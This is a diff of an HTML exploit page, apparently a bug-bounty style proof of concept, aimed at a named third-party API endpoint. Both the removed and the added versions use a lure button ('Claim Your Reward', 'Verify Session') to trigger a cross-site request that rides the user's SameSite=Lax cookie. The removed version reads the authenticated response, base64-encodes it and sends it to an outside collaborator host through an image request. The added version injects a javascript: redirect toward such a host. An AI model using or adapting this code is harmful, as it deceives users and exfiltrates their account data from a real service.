@@ -2,53 +2,23 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Claim Your Reward</title>
-    <style>
-        body { font-family: Arial, sans-serif; text-align: center; margin-top: 100px; background: #fafafa; }
-        .btn { background: #28a745; color: white; padding: 15px 30px; font-size: 18px; border: none; border-radius: 5px; cursor: pointer; text-decoration: none; display: inline-block; }
-    </style>
+    <title>Synchronizing Account...</title>
 </head>
 <body>
+    <h2>Click below to verify your session tokens</h2>
+    <button id="exploitBtn">Verify Session</button>
 
-    <h2>Click below to synchronize your account tokens</h2>
-    <!-- A standard link or button forcing user-initiated top-level navigation -->
-    <button id="exploitBtn" class="btn">Synchronize Session</button>
+    <script>
+        document.getElementById('exploitBtn').addEventListener('click', () => {
+            // 1. Target the URL parameter that handles the client-side redirect
+            // 2. Inject a payload that reads the text, base64 encodes it, and sends it to Collaborator via window.location
+            const targetUrl = "https://ocean.medishout.co.uk/v1/users/me/?platform=web" + encodeURIComponent(
+                "javascript:void(window.location='https://n2qdxml6rggzvw93tatthhg11s7kvajz.k.e-secureapp.com)"
+            );
 
-<script>
-    document.getElementById('exploitBtn').addEventListener('click', () => {
-        const targetUrl = "https://ocean.medishout.co.uk/v1/users/me/?platform=web";
-        const collaboratorUrl = "https://8ajy57trz1ok3hho1v1ep2om9df43vrk.k.e-secureapp.com";
-
-        // 1. Force a top-level navigation inside a new window reference.
-        // Because it is a top-level GET navigation, the Lax cookie IS included.
-        const targetWindow = window.open(targetUrl, "_blank");
-
-        // 2. Wait for the target page to fully load the authenticated response data
-        setTimeout(() => {
-            try {
-                // 3. Attempt to extract the data using the cross-origin reference.
-                // This succeeds if the target's CORS configuration explicitly trusts your GitHub origin.
-                if (targetWindow && targetWindow.document) {
-                    const responseBody = targetWindow.document.body.innerText;
-                    
-                    // 4. Base64 encode the stolen payload
-                    const encodedData = btoa(unescape(encodeURIComponent(responseBody)));
-                    
-                    // 5. Fire the stolen payload straight to your Burp Collaborator
-                    const exfilImg = new Image();
-                    exfilImg.src = collaboratorUrl + encodedData;
-
-                    // Optional: Clean up by closing the opened tab automatically
-                    targetWindow.close();
-                }
-            } catch (err) {
-                // If it triggers a Same-Origin Policy (SOP) error, log it to your Collaborator to debug
-                const errImg = new Image();
-                errImg.src = collaboratorUrl + btoa("SOP Block/Error: " + err.message);
-            }
-        }, 3000); // 3-second delay to give the page time to load completely
-    });
-</script>
-
+            // Trigger top-level navigation so the SameSite=Lax cookie passes cleanly
+            window.location.href = targetUrl;
+        });
+    </script>
 </body>
 </html>
